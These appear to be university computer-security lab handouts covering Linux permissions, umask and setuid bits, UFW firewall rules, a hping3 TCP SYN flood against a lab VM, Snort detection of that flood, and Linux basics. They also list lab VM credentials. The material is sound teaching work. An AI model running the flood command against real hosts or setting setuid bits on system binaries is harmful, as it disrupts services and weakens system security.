assigned to it. Whatever the permissions are, Linux allows a user to filter out unwanted permissions set by default. This default setting can be set by the user via the â€œumaskâ€ command. The command takes the permissions set during creation of file and performs a bitwise AND to the bitwise negation of the mask value. Some common umask values are 077 (only user has permissions), 022 (only owner can write), 002 (only owner and group members can write), etc. 1. In a terminal window, make sure you are the root user, otherwise switch back to the root user. 2. Use umask command to check the current mask permission and assign a new mask. a. umask Q17: What is the current mask? How is it interpreted? (try umask â€“S or the man pages) b. cd /test c. touch testmask1 d. ls -al e. Note the permissions of the file â€œtestmask1â€. f. umask 0077 Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux g. touch testmask2 h. Note the permissions of the file â€œtestmask2â€. Q18: What does it mean if the umask value is set to 0000? What is the potential security risk associated with this value of umask? Note: The risks of setting the extra bits (i.e., assigning their value to â€œ1â€) will be covered in the next section, which shows that the extra bits should not be set, in general. Section 5: setuid bit, setgid bit and sticky bit As explained in the ownership and permission section, the highest three bits of the permission value of a file represent the setuid bit, setgid bit and the sticky bit. If the setuid (setgid) bit is set on an executable file, then the uid will always be set that of the owner (group) of the file during execution. If the setuid/setgid bit is not set then the uid will be that of the user who executes the process. If the sticky bit is set on a directory, then only an owner of a file in this directory (and in addition the root user, of course) is able to rename or delete the file. In the following exercise, the objective is to demonstrate how processes are affected when the setuid bit is set. Make sure that you begin this exercise with root privileges. a. which touch b. ls â€“l /bin/touch c. chmod 4755 /bin/touch d. ls â€“l /bin/touch e. ls â€“l /home/user2 f. chmod 700 /home/user2 g. ls â€“l /home/user2 (observe timestamp and permissions) h. sudo su user1 i. touch /home/user2/HelloWorld j. sudo su root k. ls â€“l /home/user2 (observe timestamp, is it updated?) l. chmod 0755 /bin/touch m. sudo su user1 n. touch /home/user2/HelloWorld Q19: Provide a screenshot of the result. Explain why the permission is denied, even though it was previously allowed? RESTORE THE SYSTEM Below are the set of commands that you should issue to restore the system to its original form (commands No. 4 and 5 could take some time). 1. sudo su root Student Name: Course: CSCE 5550 Semester: Fall 2022 Lab: File Permissions in Linux 2. umask 0022 3. chmod 0755 /bin/touch 4. userdel user1 5. userdel user2 6. rm -rf /home/user1 7. rm -rf /home/user2 8. rm -rf /test 9. rm -rf /home/test/ NOTE: You should type â€œexitâ€ multiple times to come out of the user1 prompt before deleting this user. Q20: Provide screenshot(s) of the result. (Results of all the above commands from 1 to 9 must be shown.)"
INTRO TO COMPUTER SECURITY,5550,Firewalls IDS,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab Lab 2: Firewalls and IDS In this lab, you will be using a special version of the Ubuntu 20 VM. Download the respective OVA file from the lab page and import it as usual. The credentials are (same as before): Username: sec-lab Password: untccdc Also, you will use the Kali 20 VM, which will be the same as in the previous lab. The credentials are (same as before): Username: osboxes Password: osboxes.org NOTE: Address all the questions (Q1, Q2, etc.) marked in bold. When a screenshot is requested, try to fit all the results in one image. If this is not possible, then attach multiple screenshots. When a question is asked, e.g., â€œWho is an owner of the file?â€, type your answer, do not simply provide a screenshot. IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Introduction A firewall is a software- or hardware-based network security system that controls the incoming and outgoing network traffic based on a particular set of rules. Firewalls are classified into different types: software firewall, hardware firewall, host-based, networkbased, etc. Most of the operating systems have a software firewall to protect against network threats. Hardware firewall is a dedicated piece of hardware which protects one or more networks against threats originating from the Internet. Many routers that connect networks have some firewall features built into Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab them. Host-based firewalls are those that are present in a single host and that only manage the incoming and outgoing traffic for that host. A software firewall within an OS is a typical host-based firewall. General-purpose computers such as a PC or a server (or even a VM) with multiple network adapters can be turned into a router or firewall by setting up suitable software on it. For example, a Linux PC with two or more network adapters can be made a firewall by installing firewall software such as iptables. Below, we provide some network-related terms, which will be useful for this lab: Subnet: A subnet is a logical group of IP addresses or a subdivision of an IP network. A subnet mask, which is a 32-bit value, definesthe range of IP addressesin that subnet. A router has to be present between the nodes in two different subnets in order to enable them to communicate to each other. Port Forwarding: Port forwarding is a way of making a computer on a home or business network accessible to computers on the Internet, even though they are behind a router. It is commonly used in gaming, file exchange, security camera setup, voice over IP, and other applications. After one has set up forwarding for a port, one is said to have an open port. In this lab, we will make our VM accessible to your host computer, and to other computers that belong to your local network. UFW (Uncomplicated Firewall): This is a default firewall configuration tool for Ubuntu Linux. Developed to ease iptables firewall configuration, UFW provides a user-friendly interface to create an IPv4 or IPv6 host-based firewall. By default, UFW is disabled. Configuration of port forwarding in the VM Let us configure the VirtualBox VM network mode as â€œNATâ€. Your host OS (i.e., the OS of your host computer running VirtualBox) will access to the VM through the port forwarding configured in the network setting of the VM. 1. Setup Ubuntu VM network settings as internal: In VirtualBox: Select the Ubuntu VM Â® Right-click Â® Settings Â® Network. 2. Under Adapter1, select â€œNATâ€ from the dropdown menu. 3. Click on Port Forwarding as shown on the below screenshot: Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab Then, enter the port forwarding rules as shown on the next screenshot: Q1: Attach a screenshot of your port forwarding rules. (It should look the same as above.) Now, let us confirm that the port forward works. If you use Windows open PuTTY on your host computer (an SSH/telnet client â€“ install it, if you do not have it) and connect to localhost:2222. Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab If you use Linux/Mac OS, type â€œssh sec-lab@localhost -p 2222â€ in the terminal. Q2: Attach a screenshot of the result. On your host computer, open the web browser and access â€œlocalhost:8080â€. Q3: Attach a screenshot of the result. Section 1: UFW - Uncomplicated Firewall When UFW is activated, it uses a default set of rules (profile) that should be fine for the average home user. In short, they can be summarized as all â€œincomingâ€ is being denied, with some exceptions to make things easier for home users. 1. To turn UFW on with the default set of rules, type in the Linux terminal: sudo ufw enable 2. To check the status of UFW: sudo ufw status verbose The output should resemble the following: youruser@yourcomputer:~$ sudo ufw status verbose Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab [sudo] password for your user: Status: active Logging: on (low) Default: deny (incoming), allow (outgoing) New profiles: skip youruser@yourcomputer:~$ Q4: Attach a screenshot of the terminal showing the status of UFW. 3. Now, we will try to block incoming SSH packets by blocking the port using UFW. In the Ubuntu VM, type: sudo ufw deny ssh 4. From your host, try to establish an SSH connection again, as you did before Question 2. 5. Also, try to connect via browser with â€œhttp://localhost:8080â€â€”use a private mode (i.e., Private/Incognito/InPrivate windowâ€”the name depends on the browser). Q5: Are you able to connect to your VM or get access to localhost website? Attach a screenshot and explain what happened. 6. We are going to allow HTTP connections to the guest (Ubuntu VM acts now as a server). To allow incoming TCP packets on port 80 (http), type in the terminal of the Ubuntu VM: sudo ufw allow 80/tcp Note: We allow port 80 because it is the port of the HTTP server installed in the Ubuntu VM. The port 8080 is not used in the Ubuntu VM, it is only used for access from the host and it is redirected to port 80 of the VM. From your host, try to access â€œlocalhost:8080â€ in the browser. Q6: Attach a screenshot of the resulting browser window. Note: In the rest of the lab, we are going to deny outgoing connections from the Ubuntu VM. Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab 7. Using UFW to block outgoing traffic to website â€œwww.cnn.comâ€. The command syntax is as follows: sudo ufw deny out from any to ip-address To complete the above command, we need to know the IP address of the server www.cnn.com. 8. Type: host -t a www.cnn.com You may expect the output similar to the following: www.cnn.com is an alias for turner-tls.map.fastly.net. turner-tls.map.fastly.net has address 151.101.1.67 turner-tls.map.fastly.net has address 151.101.65.67 turner-tls.map.fastly.net has address 151.101.129.67 turner-tls.map.fastly.net has address 151.101.193.67 The main IP address of www.cnn.com is 151.101.1.67, but the server has alternative IP addresses 151.101.65.67, 151.101.129.67, and 151.101.193.67. Q7: Attach a screenshot of the result. Note: Alternatively, you can use the ping tool, but in this case, you will only get the main IP address. Type â€œping www.cnn.comâ€ and press â€œControl + Câ€, the output will be similar to the following: PING turner-tls.map.fastly.net (151.101.1.67) 56(84) bytes of data. 64 bytes from 151.101.49.67: icmp_req=1 ttl=52 time=98.8 ms 64 bytes from 151.101.49.67: icmp_req=2 ttl=52 time=28.8 ms 64 bytes from 151.101.49.67: icmp_req=3 ttl=52 time=79.2 ms 9. Test in the guest OS (Ubuntu) browser, that you are able to access the www.cnn.com website. (Note: All tests in this lab are done in the browser of the Ubuntu VM.) Q8: Attach a screenshot of the resulting browser window. Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab 10. Now, we will run the following command: sudo ufw deny out from any to 151.101.1.67 After that, you may not be able to access to the www.cnn.com webpage. 11. Try to access www.cnn.com in the browser. 12. If you still are able to connect, follow the steps mentioned in the note below. Note: In order to completely deny access to the domain www.cnn.com, we need to cover all the IP addresses obtained using â€œhost -t a www.cnn.comâ€ along with the alternative IP addresses mentioned earlier. Q9: Attach a screenshot of the resulting browser window. 13. Check the UFW status again: sudo ufw status verbose Q10: Attach a screenshot of the result. 14. Delete the last rule using the following command: sudo ufw delete deny out from any to 151.101.1.67 Note: If you have added more than one rule for restricting access to www.cnn.com, then delete all of the rules related to accessing this website. Confirm that the access to the www.cnn.com page has been restored. 15. Now, we will block the access to the cse01.cse.unt.edu machine on the port 22 (SSH service). The command for adding this rule can be typed in the Ubuntu VM terminal as follows (you need to fill in the IP address and the port number): sudo ufw deny out from any to ip-address port port-number Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab To test whether the rule is working, in a terminal, try to establish a connection to cse01.cse.unt.edu server at port 22 (default SSH port). Remember that you need to use your EUID as a username for this connection. The corresponding command is: â€œssh euid@cse01.cse.unt.eduâ€. Q11: Attach a screenshot of the terminal showing that you cannot create a SSH connection. (It must show that the SSH access is denied or not working anymore.) 16. Delete the above rule by typing: sudo ufw delete deny out from any to ip-addess port-number 17. Now, try to establish an SSH connection to cse01.cse.unt.edu again. Q12: Were you able to establish a connection? Attach a screenshot of the result. 18. Terminate your session on CSE machine using the command â€œexitâ€, in case if you are logged in. 19. Reset UFW on your Ubuntu20 VM and disable it: sudo ufw reset sudo ufw disable 20. Power off the Ubuntu VM. Section 2: Denial of Service (DoS) Attack â€“ TCP SYN Flood In this section, we will run the TCP SYN flooding attack against the Ubuntu VM (target) from the Kali VM (attacker). We will use the hping3 utility (www.hping.org), a TCP/IP packet assembler/analyzer â€“ it is commonly used for network testing and port scanning. Note: The Kali 20 VM will be the same as in the previous labs. First, let us configure the VMs so that they can communicate with each other. Note that the VMs must be powered off during this configuration process. 1. Use the following Bridged Adapter settings for the Ubuntu VM: Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab 2. We recommend you to â€œrefreshâ€ your Kali VM, i.e., to import it again from the respective OVA file. (Note that your previous work on that VM will be lost.) 3. Apply the following network adapter settings for the Kali VM: 4. Start both the VMs and login with the respective credentials (Kali: osboxes/osboxes.org, Ubuntu: sec-lab/untccdc). 5. On Kali VM, start the Terminal and type â€œifconfigâ€. Notice the IP address and interface name (it may be different in your case): Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab 6. On Ubuntu VM, open the Terminal and type â€œifconfigâ€. Notice the IP address and interface name (it may be different in your case): 7. Next, we will access the Ubuntu VM from Kali VM via HTTP. Open the Firefox browser in Kali and type http://<ip address> as shown below. You may expect to see the page as shown below. Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab 8. From Kali VM, let us run an attack against the web server as follows: Open the terminal and type the following command (omit the square brackets): sudo hping3 [web server IP address] -p 80 -S --flood --rand-source Let us briefly discuss the parameters of the above command. â€¢ -p 80 : since we would like to attack the web server on the Ubuntu VM, we set the HTTP port 80. â€¢ -S : specifies TCP SYN packets. â€¢ --flood : the packets are send as fast as possible and replies are ignored. â€¢ --rand-source : a random IP source address is set. Q13: Attach a screenshot of the result. 9. Run Wireshark on the Ubuntu VM: sudo wireshark In the Wireshark, start capturing packets. Q14: Attach a screenshot of the result. 10. Access the Ubuntu VM via browser with address (http://[Ubuntu VM IP address]) from your Kali VM â€“ use a new private window in the browser. Then, refresh your browser window Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab several times. Probably, you can still access the Ubuntu VM, which shows that a single instance of hping have not yet overloaded the web server. If this is the case, then run another instance of the hping utility (use a new terminal window) â€“ for this, repeat the steps described in Item 8. 11. Check if you are still able to access the web server â€“ just refresh the browser window. If it is still possible, keep adding the hping instances until the access to the Ubuntu VM via browser becomes very slow (or stops completely). Now, this would indicate that the VM is overloaded by your DoS attack. Note: Keep adding the hping instances until you have 10 of them running simultaneously. After that, proceed to the next step. Q15: Report your observations from the above steps. In particular, how many hping instances did you have to run? Did it slow down the access to Ubuntu VM via browser? 12. Stop all the hping instances on Kali VM (press Ctrl+C for exiting an hping process). Make sure that you stop/kill all the hping instances. At this moment, your VM might be still overloaded and you may not have access to it. If this is the case, rebooting it should solve the issue. Close Wireshark on Ubuntu. Section 3: Intrusion Detection Systems (IDS) â€“ Snort IDS is a software/hardware system which monitors network traffic for attacks or policy violations. The policies are defined as a set of rules. When their violation is detected, IDS typically alerts administrators and/or automatically deploys certain pre-set countermeasures. IDS is typically used inside the local network as the next line of defense after firewalls. In this section, we will use the Snort IDS (https://www.snort.org) to detect the TCP SYN flood attack. Again, the attacker will use the Kali VM and the Ubuntu VM will be a target. 13. Let us first install and configure Snort on the Ubuntu VM. (Note that Snort comes with some default rulesets.) Run the following command: sudo apt-get install snort You may expect to see a notification similar to the one shown below. Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab 14. Press Tab on the keyboard to move your selection to <Ok> and press Enter. During the installation, you will need to specify your network information. Input your interface name as shown below. In our case, it was â€œenp0s3â€. You can get your network information using the command â€œifconfigâ€, as shown earlier. Note: If the terminal shows that ifconfig command is missing, then install the package net-tools using the command â€œsudo apt-get install net-toolsâ€. Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab 15. Add network 10.120.0.0/16 to the next page with a comma as shown below. Press Tab and then press Enter in the next screen. 16. On the next page, select <Ok> by pressing Tab and then Enter. Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab After that, your installation will be complete. Q16: Attach a screenshot of the result. (Only one screenshot, which shows the terminal after the installation has been completed, is enough.) 17. Next, we will slightly change the default output format of Snort to make it convenient for the purpose of this lab. Edit the file /etc/snort/snort.debian.conf with the root privilege (use â€œsudoâ€) and update the line starting with DEBIAN_SNORT_OPTIONS with the following: DEBIAN_SNORT_OPTIONS="" -A full "" 18. Now, let us add a custom rule for the TCP SYN flood detection. For that, we will add the following rule in the file /etc/snort/rules/dos.rules (as a new line at the end) using the root privilege: alert tcp any any -> $HOME_NET 80 (flags: S; msg:""Possible TCP SYN flood""; detection_filter: track by_dst, count 50, seconds 10; sid:1000001;) â€¢ The first six parameters of the above rule require to generate an alert for a TCP connection from any source IP address and port to any IP address in the protected network, port 80 (http). Student Name: Course: CSCE 5550 Semester: Fall 2022 Firewalls and IDS Lab â€¢ The following conditions, which are specified in the brackets, need to be met: the packet must be SYN, and the following rate must be exceeded (counted by the destination IP): within each 10-second frame, after 50 packets which satisfy the conditions, each next packet will trigger an alert. Note that these conditions define what frequency of packets will be considered an attackâ€”this frequency must be substantially higher compared to what you normally expect for your network. â€¢ The last parameter is a Snort identifier of your new rule. (We use this number because the SIDâ€™s before 1000000 are reserved by Snort.) Q17: Attach a screenshot of the updated dos.rules file. 19. After you updated the dos.rules file, restart Snort by typing: /etc/init.d/snort restart 20. Next, run the attack described in Section 2 again from Kali VM (a single hping instance is sufficient). 21. Monitor the Snort log file, using the following command: tail -f /var/log/snort/alert You should be able to see the output with your own ruleâ€™s sid (1000001). Q18: Attach a screenshot of the result. Explain what you see."
INTRO TO COMPUTER SECURITY,3550,Linux Basics,"Lab 2a: Linux Basics Lab This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas. â¦ Section 1: Overview of Linux â¦ A typical Linux operating system is made up of three parts: the kernel, the shell and the applications. â¦ Kernel: The kernel of Linux is the hub of the operating system: it allocates time and memory to programs and handles the file storage as well as response to system calls. â¦ Shell: The shell acts as an interface between the user and the kernel. When a user logs in (into command line only environment), the login program checks the username and password, and then starts another program called the shell. The shell is a command line interpreter (CLI). It interprets the commands, which are typed by the user, and it arranges for them to be carried out. TheÂ commands are themselves programs: when they terminate, the shell gives the user another prompt. A graphical user interface for the shell is called Terminal. â¦ Desktop Environment: Linux operating systems also have a graphical user interface (GUI) through which users can access applications and system resources. Unlike other operating systems Linux OS has many Desktop Environments available. Users are free to install the GUI of their choice. Some popular ones are GNOME, KDE, XFCE, Ubuntu Unity, etc. When one installs aÂ Linux system, it comes with a default GUI. One can install other GUIs at any time, but only one GUI environment can be used at a time. For example, Kali Linux comes with GNOME. â¦ Linux Directory Structure: In Linux, files and directories (folders) are laid out on disk in hierarchical fashion in a tree structure. The top directory is called root folder, it is denoted by â€œ/â€ (slash). AÂ collection of all files and directories in a Linux machine is referred to as aÂ â€œfilesystemâ€. â¦ A path (location) of a file or directory in the filesystem is written starting from the root directory (/) followed by all intermediate directory names, which are separated by a slash with the actual file name (or directory name) in the end of the path. Example: the file path of the file â€œreport.docâ€ in the above figure is written as â€œ/home/its/ug1/ee51vn/report.docâ€. â¦ Notes: â¦ In the path /home/its/ug1/ee51vn/report.doc, do not get confused between first slash / which denotes the root directory and subsequent slashes, which are used to separate directories at each level of the path. â¦ There are no spaces in a file path. Example: The file path /home/its/ug1/ee51vn/report.doc is the one single string with no spaces between slashes and subsequent folder names. Q1: Write the path for directory staff in the above figure. Different default directories under the / directory are used for some specific purposes. /bin : All executable binary files (including commands) are present in this directory. /dev : Contains device files for hardware devices (usb, cdrom etc.) /etc : Contains applicationâ€™s configuration files, startup, shutdown, start, stop script for every individual program. /home : Home directory of the users. Every time a new user is created, a directory with the corresponding username is created within /home which contains other directories such as Desktop, Downloads, Documents, etc. /lib : Contains the kernel modules and shared library images required to boot the system and run commands in the root file system. /lost+found : This directory is created during installation of Linux, useful for recovering files which may be broken due to unexpected shutdown. /media : Temporary mount directory is created for removable devices viz., media/cdrom. /mnt : Temporary mount directory for mounting file system. /opt : Contains the third-party application software viz. Java, etc. /proc : A virtual and pseudo filesystem which contains information about running processes with aÂ particular process id abbreviated as â€œpidâ€. â¦ Section 2: Introduction to Ubuntu Linux There exist many Linux OS distributions (around 3500 are known), but most of them are created from the same Linux kernel. We will use Ubuntu and Kali Linux for most of the labs in this course. Kali is mainly used for computer security and digital forensics applications. Other popular Linux variants are Redhat, Debian, and CentOS. An OVA file is an Open Virtualization Appliance that contains a compressed, â€œinstallableâ€ version of a virtual machine. When you open an OVA file, it extracts the VM and imports it into whatever virtualization software you have installed on your computer. The instructions below explain how to install an OVA file in Oracle VirtualBox. Briefly, these steps are: â¦ If it is not already on your computer, download and install VirtualBox â€“ https:///www.virtualbox.org/wiki/Downloads. You can find instructions on how to do this at the Installing VirtualBox wiki page. â¦ For Mac users, select â€œOS X hostsâ€. Run the file and follow the on-screen directions. â¦ You can launch VirtualBox from the Applications and â€œKeep in dockâ€ if desired. â¦ Obtain the specified OVA file from Canvas. You should then be able to double-click the OVA file to open it in VirtualBox and then click Import to start importing the OVA file into your library. This process may take several minutes, depending on the size of your OVA file. â¦ Once VirtualBox has completed importing the OVA file, you should be able to see the virtual machine in your list. Select Start (or double-click the VM object in the list) to launch the VM. Use the Ubuntu 20.04 VM with the following credentials: username: sec-lab password: untccdc Note: If the VM does not start, in VirtualBox window, select the Ubuntu 20.04 VM, then in the menu select Settings â†’ Network; the value in the field Attached to should be set as NAT: Then, press OK, and try again. The default environment on Ubuntu OS (desktop version) is shown in the next figure. On the left, you find a menu bar: Firefox Browser, Home folder, Ubuntu Software, Help, and Show Applications. Here are some basic operations: â¦ To Open Terminal: Click on Show Applications, then select Utilities and click in the â€œTerminalâ€ icon. â¦ To Open Web Browser: Click on the Firefox Web Browser. â¦ To Open Text Editors: Click on Show Applications and then click the â€œText Editorâ€ icon. â¦ To Open File System: Click on Home folder. â¦ Open Terminal by clicking on Show Applications, then select Utilities, and click in the â€œTerminalâ€ icon. â¦ You will see a Terminal window like the following one: The text sec-lab@unt-sec:~$ is the shell prompt. It means that a user sec-lab, is logged into a machine unt-sec. The symbol â€œ$â€ indicates an ordinary (unprivileged) user. The superuser (root) would have aÂ symbol â€œ#â€ instead. For an ordinary user bob, the prompt looks as follows: bob@unt-sec:~$ . TheÂ ~ (tilde) symbol indicates that the user is currently in his home directory. For the â€œrootâ€ user the home directory is /root. For the user â€œsec-labâ€ the home directory would be /home/sec-lab. In later sections, we will explore the difference between a superuser (root) and an ordinary user. Notes: â¦ To separate commands from normal text, we used double quotes but when you are typing commands in shell do it WITHOUT QUOTES. In every tutorial (online tutorials or textbooks) it is customary to use a certain text scheme to separate command from normal text. By the end of the lab, you will be able to differentiate between normal text and Linux commands. â¦ The italic part in a command is a sample name â€“ you will have to use an actual name according to your environment. For example, if you are requested to type â€œ/home/usernameâ€, and your username is â€œbobâ€, you will need to type â€œ/home/bobâ€. â¦ All commands in Linux are case-sensitive, e.g., â€œpwdâ€ and â€œPwdâ€ are not considered same. IMPORTANT NOTE: In the rest of this lab, you will replace â€œEUIDâ€ with your EUID. Example: Let your EUID be â€œaa0001â€; when instructed to type aÂ command â€œadduser EUIDâ€, you will type â€œadduser aa0001â€, and when instructed to type aÂ command â€œadduser EUIDnewâ€, you will type â€œadduser aa0001newâ€. â¦ User Account Management â¦ Create a new user account (for yourself): â¦ Type â€œsudo suâ€. The system will ask for the root password. Type â€œuntccdcâ€ as the password. The shell prompt will change to # and you are working now as a user root. â¦ Type â€œadduser euidâ€. â¦ Enter a password for your account. You have to do it twice. Note: Passwords are not shown in terminal as you type them. Usually while typing password youâ€™ll see *****(stars) or in â€¦â€¦â€¦ (dots). But here you donâ€™t see anything on a Linux Terminal. â¦ Add further user details. These details are optional-you can just hit enter to skip for Full Name, Number, Phone etc.) â€“See the below screenshot. â¦ Type â€œyâ€ at â€œIs this information correct?â€ â¦ To change a user password, use passwd command. Example: passwd euid â¦ Add new user to sudoers file to give them superuser permissions. â¦ Type â€œnano /etc/sudoersâ€. (Here, â€œnanoâ€ is a command-line text editor - details are provided in the Text Editors section of this manual.) â¦ In this file, add the following line: Username ALL=(ALL:ALL) ALL. Add this line next to the following one: root ALL=(ALL:ALL) ALL You have to provide your newly created username. â¦ Press Control+O, Press Enter, when asked for confirmation, Press Control+X to exit â¦ Close the terminal window. â¦ Go to the upper menu and expand the dropdown, expand the Power Off/ Log Out menu and then select Power Offâ€¦ Then, in the dialog box, select the Restart button to restart. Now select the newly created account and login. You may Skip and click on Next until youâ€™re able to select Done to complete the setup of the new account. Q2: Login to your new user account, open a terminal and type â€œsudo suâ€, enter sudo password for your account, and submit a screenshot. The screenshot should clearly show the prompt. It will look like â€œroot@usudont-sec:/home/euidâ€. â¦ Create another user from your account. â¦ Open Terminal after logging into your account. â¦ Type â€œsudo adduser euidnewâ€. Enter sudo password for your account. Note: the user password is asked when you use the â€œsudoâ€ command for first time in aÂ terminal. â€œsudoâ€ is used to elevate a normal user to root user for execution certain high privilege commands. â¦ Add a (unix) password for new user euidnew twice and rest of the details as earlier. â¦ To change to root user from normal user (type â€œexitâ€ if currently in root mode for user): â¦ Type â€œsudo su â€“â€. â¦ If prompted, type the root user password at the prompt. After successful login, you should observe aÂ change in shell prompt from your user to root user. â¦ Type â€œexitâ€ to exit from the root user. Now you should be back to you user prompt. â¦ Type â€œtail /etc/passwdâ€ (note that â€œ/etc/passwdâ€ is one stringâ€”no spaces in between). Q3: Attach a screenshot of the result. A root user (also referred to as a superuser) is an administrator of the system who has full privileges by default, while normal users have limited privileges. Normal users need to use the â€œsudoâ€ command in order to temporarily gain certain high-privilege commands. Example of these commands are: software installation, changing to the root user in a terminal, changing the system settings, and others. Some Basic Commands Files and Directories â¦ pwd â€“ present working directory Type â€œpwdâ€ at command prompt (without quotes). This command displays the directory in which you are currently. When a user starts a shell the default directory is userâ€™s home directory: /home/euid. â¦ cd â€“ change directory This command is used to change to a desired directory from current directory. â¦ Type â€œcd /homeâ€ (without quotes). This will move the user to the /home directory. â¦ Type â€œpwdâ€. What is it showing â¦ Type â€œcd -â€. This will take you back to previous directory, i.e., your home directory â¦ You can use â€œcd ~â€ to go back to your home directory from. (~ Tilde symbol) â¦ . (single dot) refers to current directory, ..(double dots) refer to parent directory. â€œcd .â€ keeps you in same directory, while â€œcd ..â€ moves to parent directory, a level above. â€œcd ../..â€ moves you two levels above the current directory. â¦ ls â€“ list ls command simply lists file and directories in present directories. Option â€œâ€“lâ€ which gives more details about files which include file size, time created, file permissions etc â¦ Type â€œls â€“lâ€ To display details of a directory or file: ls â€“l directory or file name. Ex: ls â€“l Desktop â¦ Type â€œls â€“laâ€ Q4: What output â€œls â€“laâ€ gives (take a screenshot)? Q5: What difference did you observe between theÂ results of â€œls â€“lâ€ and â€œls â€“laâ€? What does the option â€œ-aâ€ mean? Hint: Refer to the man page: man ls. Also, see the section on man help below. â¦ mkdir - create a directory â¦ Type â€œmkdir firstdirâ€. It creates a new directory called firstdir. You can also create multiple directories and also nested directories â¦ Type â€œmkdir dir1 dir2 dir3.â€ It creates 3 directories in present directory. â¦ Type â€œmkdir â€“p dir11/dir22/{dir33, dir44}â€. It creates 4 directories: dir11, dir22 inside dir11, dir33 and dir44 inside dir22. â¦ Type â€œ lsâ€ â¦ rm - delete a file or directory â¦ type â€œrm â€“r dir3â€. You can also use â€œrmdirâ€ but it only deletes empty directories â¦ touch - create empty file(s) â¦ Type â€œtouch file1 file2 file3â€. â¦ mv - move or rename files and directories â¦ Type â€œmv file1 dir1â€ - this moves (cut and paste) the file file1 to the directory dir1. â¦ Type â€œmv file2 file22â€. â¦ Type â€œlsâ€. â¦ cp - copy files and directories Type the following commands in the order shown below: â¦ â€œtouch file4â€. Creates a file with the name file4. â¦ â€œmkdir dir4â€ . Creates a directory dir4. â¦ â€œcp file4 dir4â€. Copies file4 to dir4. â¦ â€œmkdir dir5â€. Creates another directory dir5. â¦ â€œcp -r dir4 dir5â€. Copies dir4 to dir5. Q6: Why do we have to use â€œ-râ€ option to copy directories? (Hint: Use man cp.) â¦ find - to find files and directories. â¦ Type â€œfind /root â€“name file1â€. Q7: What is the result? (Show the screenshot.) You are searching for the file with name file1 in the directory /root. This command will search for the file in /root and in all its subdirectories. You gave /root as search location as you think file1 must be somewhere in it. If you have no information where the file might be in your system, you should start searching for it from the most top directory in the filesystem, that is â€œ/â€. In this later case, the command should be find / -name file1. â¦ The absolute path of a file or directory is its path written from the root of the file system. For example, consider the directory dir44 you created earlier in Step 5. Its absolute path is /home/euid/dir11/dir22/dir44. â¦ The relative path of a file or directory is its path from the current directory. Now, you are in your home directory which is /home/euid. The relative path of dir44 from this directory is dir11/dir22/dir44. One writes the relative path starting from a directory one level below, i.e., dir11 in our case. â¦ One can refer to a file or directory either using relative or absolute path (both are possible). â¦ Type â€œtouch /home/euid/dir11/dir22/dir44/file44â€. (Replace username you actual username). â¦ Type â€œdir11dir22/dir44/file55â€ Either way you are able can access dir44 Note: When using the relative path, one should be aware of the current directory. In the above example, when the current directory changes to home, then the relative path to dir44 changes to euid/dir11/dir22/dir44. File Compression and Archiving â¦ To compress and archive files: In Linux file compression and archiving (grouping file together) and compression are two different activities. First, we archive multiple files with â€œtarâ€ command. A file with â€œ.tarâ€ extension is created. Then we zip (compress the file) with gzip command. (gzip-stands for gunzip is compression tool in linux. Bunzip (bzip2) and zip are other commonly used compression tools) â¦ Type â€œtouch a b c dâ€. Creates 4 files a, b, c and d. â¦ tar â€“cf compressed.tar a b c d. We are creating a tar file compressed.tar from the files a, b, c and d. â¦ gzip â€“vf compressed.tar. This should create a file compressed.tar.gz. Note: For â€œtarâ€ command, you should supply output filename along with .tar extension. For gzip, it automatically creates a zipped file with .gz extension. You no longer have .tar file after you compressed it with gzip. â¦ You can also do it in single step which is usually the preferred way: type â€œtar â€“zcvf compressed2.tar.gz a b c dâ€. â¦ To extract and uncompress files: â¦ Type â€œrm â€“rf a b c dâ€. Deleting the files. â¦ Type â€œlsâ€. â¦ Type â€œgzip â€“dvf compressed.tar.gzâ€ â€“ you will get the file compressed.tar. â¦ Type â€œtar â€“xvf compessed.tarâ€. You will get the original files a, b, c and d. â¦ Type â€œlsâ€. â¦ As before, you can uncompress and extract the compressed2.tar.gz in a sigle step: Type â€œtar â€“zxvf compressed2.tar.gzâ€. Getting help with the man command The â€œmanâ€ command is used to get help for any command in Linux. man stands for manual. To pull up a man page of a command, type man command. Ex: man ls. This command displays list of options available with the command. Man pages explain different options and syntax of a command and are usually difficult to understand for beginners. If you want to know usage and example for a command, google is the best place to look. Type â€œqâ€ to quit from man page. â¦ Section 3: File Permissions and Access Control In Linux a file has read, write and execute permissions. And permissions are assigned to users of three categories: owner, group and others. The user who creates a file will be the owner, group is group of users who has access. Others are all the users other than owner and users in the group. â¦ Understanding file/directory permissions: Type ls â€“l filename to list the file permissions. The below figure explains the file details displayed. Each file (and directory) has associated access rights, which may be found by typing ls -l. Also, ls -lg gives additional information as to which group owns the file (beng95 in the following example): -rwxrw-r-- 1 ee51ab beng95 2450 Sept29 11:52 file1 In the left-hand column is a 10 symbol string consisting of the symbols d, r, w, x, -, and, occasionally, s or S. If d is present, it will be at the left hand end of the string, and indicates a directory: otherwise - will be the starting symbol of the string. The 9 remaining symbols indicate the permissions, or access rights, and are taken as 3 groups of 3. â¦ The left group of 3 gives the file permissions for the user that owns the file (or directory) (ee51ab in the above example); â¦ the middle group gives the permissions for the group of people to whom the file (or directory) belongs (eebeng95 in the above example); For every 